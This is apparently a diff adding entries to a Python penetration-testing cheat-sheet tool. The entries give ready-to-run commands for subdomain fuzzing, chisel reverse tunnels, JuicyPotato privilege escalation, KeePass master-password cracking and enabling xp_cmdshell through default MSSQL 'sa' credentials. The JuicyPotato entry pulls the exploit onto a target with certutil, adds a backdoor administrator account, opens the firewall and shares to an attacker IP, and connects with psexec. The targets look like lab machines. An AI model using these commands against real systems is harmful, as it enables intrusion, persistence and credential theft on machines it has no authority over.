+> curl -s -H "Host: thatsubdomaindontexist.site.com" http://site.com | wc -c
+
+612
+
+# Filter out response and FUZZ Hosts
+> ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://site.com -H "Host: FUZZ.site.com" -t 500 -fs 612
+"""
+
+######################################
+######################################
+
+chisel_portforwarding = Cheat("chisel - port forwarding - TCP/UDP tunnel")
+chisel_portforwarding.category = "Tools"
+chisel_portforwarding.output = """[*] Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH, for port forwarding.
+
+# Server - is my kali machine waiting for connection.
+sudo chisel server -p 8008 --reverse   # port 8008 is the port of the chisel server, where chisel comunicate to other chisel
+
+# Client - is the target machine we want to bypass firewall rules, forwarding it
+# Next example, we connect to kali machine on port 8008 (where server chisel is), and we say the kali port 80 is 127.0.0.1:80 of the target machine.
+./chisel client 10.10.14.43:8008 R:80:127.0.0.1:80     
+
+# We can connect more then one ports at same time...
+./chisel client 10.10.14.43:8008 R:80:127.0.0.1:80 R:1337:127.0.0.1:1337 R:3306:127.0.0.1:3306 R:8000:127.0.0.1:8000 R:52352:127.0.0.1:52352
+"""
+
+######################################
+######################################
+
+jwt_openssl = Cheat("JWT - openssl")
+jwt_openssl.category = "Web"
+jwt_openssl.output = """[*] Generate privKey to manipulate JWT token
+
+openssl genrsa -out privKey.key 2048
+"""
+
+######################################
+######################################
+
+juicyPotato = Cheat("JuicyPotato.exe - Windows - PrivEsc - SeImpersonatePrivilege")
+juicyPotato.category = "Tools"
+juicyPotato.output = """[*] If in life you see SeImpersonatePrivilege, just use JuicyPotato!! =)
+
+# Download JuicyPotato.exe and set a server http
+wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
+sudo python3 -m http.server 80
+
+# transfere to target machine
+certutil -urlcache -f http://10.10.14.16/JuicyPotato.exe C:\\Temp\\JuicyPotato.exe
+
+# Run! - Create a new user j4vali with password J4v4li123$!  
+# (Close to always need a password like this!!)
+# Run multiple times while showing OK!
+cd C:\\Temp
+.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user j4vali J4v4li123$! /add"
+.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators j4vali /add"
+
+# Add my ip to allow all traffic UDP and TCP
+.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c powershell New-NetFirewallRule -DisplayName pwned -RemoteAddress 10.10.14.16 -Direction inbound -Action Allow"
+
+# Add permission to execute command from out of the local system (cmd)
+.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
+
+# Open Ports (cmd)
+.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=in localport=445 action=allow"
+.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=out localport=445 action=allow"
+.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL"
+
+
+# ------------------------------------------------------------------------
+# Check if all correctly created (need to be \033[33;1m(Pwn3d!)\033[31;1m)
+crackmapexec smb 10.10.10.93 -u 'j4vali' -p 'J4v4li123$!'
+
+# On kali linux, we can now connect to the machine with ipexec.py or something like that:
+psexec.py WORKGROUP/j4vali:@10.10.10.93 cmd.exe
+"""
+
+######################################
+######################################
+
+keepass = Cheat("keepassxc - Password Manager KeePass Manager")
+keepass.category = "Tools"
+keepass.output = """[*] Extract passwords of KeePass (GUI)
+
+sudo install keepassxc
+keepassxc  # GUI application
+
+# For try cracking master password, use keepass2john
+keepass2john tim.kdbx > hash
+john --wordlist=/usr/share/wordlist/rockyou.txt hash
+"""
+
+######################################
+######################################
+
+sqsh = Cheat("sqsh - sqsh - Interactive database shell (mysql for 1433/tcp  open  ms-sql-s) - mssqlclient.py")
+sqsh.category = "Tools"
+sqsh.output = """[*] sqsh - Interactive database shell
+
+# Default Credentials are sa:sa OR sa without password (just press Enter)
+sqsh -S 10.10.10.59 -U "sa"
+
+# Commands:
+# Try to execute comands on local machine
+xp_cmdshell "whoami"
+go
+
+# If SQL Server blocked access to procedure...
+sp_configure "show advanced options", 1
+go
+reconfigure
+go
+sp_configure "xp_cmdshell", 1
+go
+reconfigure
+go
+
+[*] mssqlclient.py - better then sqsh. Dont need "go"... all time xD
+
+mssqlclient.py WORKGROUP/sa@10.10.10.59
+xp_cmdshell "whoami"
+sp_configure "show advanced options", 1
+reconfigure
+sp_configure "xp_cmdshell", 1
+reconfigure
 """
